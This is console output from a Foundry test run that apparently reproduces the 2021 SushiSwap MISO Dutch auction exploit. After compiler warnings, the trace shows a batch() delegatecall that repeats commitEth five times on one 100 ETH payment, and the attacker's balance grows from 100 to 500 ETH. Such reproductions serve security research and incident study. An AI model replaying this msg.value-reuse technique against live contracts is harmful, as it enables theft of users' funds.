Compiling 28 files with Solc 0.8.25
Solc 0.8.25 finished in 1.24s
Compiler run successful with warnings:
Warning (2519): This declaration shadows an existing declaration.
   --> src/test/interface.sol:886:5:
    |
886 |     function WETH() external view returns (address);
    |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1598:5:
     |
1598 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1850:5:
     |
1850 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:2560:5:
     |
2560 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:3759:5:
     |
3759 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
  --> src/test/2021-09/Sushimiso_exp.sol:22:5:
   |
22 |     IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
   |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).


Ran 1 test for script/Exploit-template_new.sol:ExploitScript
[PASS] testExploit() (gas: 20485)
Logs:
  Attacker ETH Balance Before exploit: 0.000000000000000000
  Attacker ETH Balance After exploit: 0.000000000000000000

Traces:
  [20485] ExploitScript::testExploit()
    ├─ [0] VM::deal(ExploitScript: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
    │   └─ ← [Return] 
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance Before exploit", val: 0, decimals: 18)
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance After exploit", val: 0, decimals: 18)
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 230.09ms (181.53µs CPU time)

Ran 1 test for src/test/2021-09/Sushimiso_exp.sol:ContractTest
[PASS] testExploit() (gas: 588992)
Logs:
  Before exploit, ETH balance of attacker:: 100000000000000000000
  Before exploit, ETH balance of DutchAuction:: 112666020243246720000000
  After exploit, ETH balance of attacker:: 500000000000000000000
  After exploit, ETH balance of DutchAuction:: 112266020243246720000000

Traces:
  [588992] ContractTest::testExploit()
    ├─ [0] 0x0000000000000000000000000000000000000000::fallback{value: 79228162414264337593543950335}()
    │   └─ ← [Stop] 
    ├─ emit log_named_uint(key: "Before exploit, ETH balance of attacker:", val: 100000000000000000000 [1e20])
    ├─ emit log_named_uint(key: "Before exploit, ETH balance of DutchAuction:", val: 112666020243246720000000 [1.126e23])
    ├─ [80471] 0x4c4564a1FE775D97297F9e3Dc2e762e0Ed5Dda0e::batch{value: 100000000000000000000}([0x297629600000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e14960000000000000000000000000000000000000000000000000000000000000001, 0x297629600000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e14960000000000000000000000000000000000000000000000000000000000000001, 0x297629600000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e14960000000000000000000000000000000000000000000000000000000000000001, 0x297629600000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e14960000000000000000000000000000000000000000000000000000000000000001, 0x297629600000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e14960000000000000000000000000000000000000000000000000000000000000001], true)
    │   ├─ [77582] 0x364B7E2d5B11b9D2016D232fA271D89d5E6065f1::batch{value: 100000000000000000000}([0x297629600000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e14960000000000000000000000000000000000000000000000000000000000000001, 0x297629600000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e14960000000000000000000000000000000000000000000000000000000000000001, 0x297629600000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e14960000000000000000000000000000000000000000000000000000000000000001, 0x297629600000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e14960000000000000000000000000000000000000000000000000000000000000001, 0x297629600000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e14960000000000000000000000000000000000000000000000000000000000000001], true) [delegatecall]
    │   │   ├─ [20320] 0x4c4564a1FE775D97297F9e3Dc2e762e0Ed5Dda0e::commitEth{value: 100000000000000000000}(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], true) [delegatecall]
    │   │   │   ├─ [20145] 0x364B7E2d5B11b9D2016D232fA271D89d5E6065f1::commitEth{value: 100000000000000000000}(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], true) [delegatecall]
    │   │   │   │   ├─ [55] ContractTest::receive{value: 100000000000000000000}()
    │   │   │   │   │   └─ ← [Stop] 
    │   │   │   │   └─ ← [Stop] 
    │   │   │   └─ ← [Return] 
    │   │   ├─ [12320] 0x4c4564a1FE775D97297F9e3Dc2e762e0Ed5Dda0e::commitEth{value: 100000000000000000000}(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], true) [delegatecall]
    │   │   │   ├─ [12145] 0x364B7E2d5B11b9D2016D232fA271D89d5E6065f1::commitEth{value: 100000000000000000000}(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], true) [delegatecall]
    │   │   │   │   ├─ [55] ContractTest::receive{value: 100000000000000000000}()
    │   │   │   │   │   └─ ← [Stop] 
    │   │   │   │   └─ ← [Stop] 
    │   │   │   └─ ← [Return] 
    │   │   ├─ [12320] 0x4c4564a1FE775D97297F9e3Dc2e762e0Ed5Dda0e::commitEth{value: 100000000000000000000}(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], true) [delegatecall]
    │   │   │   ├─ [12145] 0x364B7E2d5B11b9D2016D232fA271D89d5E6065f1::commitEth{value: 100000000000000000000}(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], true) [delegatecall]
    │   │   │   │   ├─ [55] ContractTest::receive{value: 100000000000000000000}()
    │   │   │   │   │   └─ ← [Stop] 
    │   │   │   │   └─ ← [Stop] 
    │   │   │   └─ ← [Return] 
    │   │   ├─ [12320] 0x4c4564a1FE775D97297F9e3Dc2e762e0Ed5Dda0e::commitEth{value: 100000000000000000000}(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], true) [delegatecall]
    │   │   │   ├─ [12145] 0x364B7E2d5B11b9D2016D232fA271D89d5E6065f1::commitEth{value: 100000000000000000000}(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], true) [delegatecall]
    │   │   │   │   ├─ [55] ContractTest::receive{value: 100000000000000000000}()
    │   │   │   │   │   └─ ← [Stop] 
    │   │   │   │   └─ ← [Stop] 
    │   │   │   └─ ← [Return] 
    │   │   ├─ [12320] 0x4c4564a1FE775D97297F9e3Dc2e762e0Ed5Dda0e::commitEth{value: 100000000000000000000}(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], true) [delegatecall]
    │   │   │   ├─ [12145] 0x364B7E2d5B11b9D2016D232fA271D89d5E6065f1::commitEth{value: 100000000000000000000}(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], true) [delegatecall]
    │   │   │   │   ├─ [55] ContractTest::receive{value: 100000000000000000000}()
    │   │   │   │   │   └─ ← [Stop] 
    │   │   │   │   └─ ← [Stop] 
    │   │   │   └─ ← [Return] 
    │   │   └─ ← [Return] [true, true, true, true, true], [0x, 0x, 0x, 0x, 0x]
    │   └─ ← [Return] [true, true, true, true, true], [0x, 0x, 0x, 0x, 0x]
    ├─ emit log_named_uint(key: "After exploit, ETH balance of attacker:", val: 500000000000000000000 [5e20])
    ├─ emit log_named_uint(key: "After exploit, ETH balance of DutchAuction:", val: 112266020243246720000000 [1.122e23])
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 253.03ms (888.13µs CPU time)

Ran 2 test suites in 255.05ms (483.12ms CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
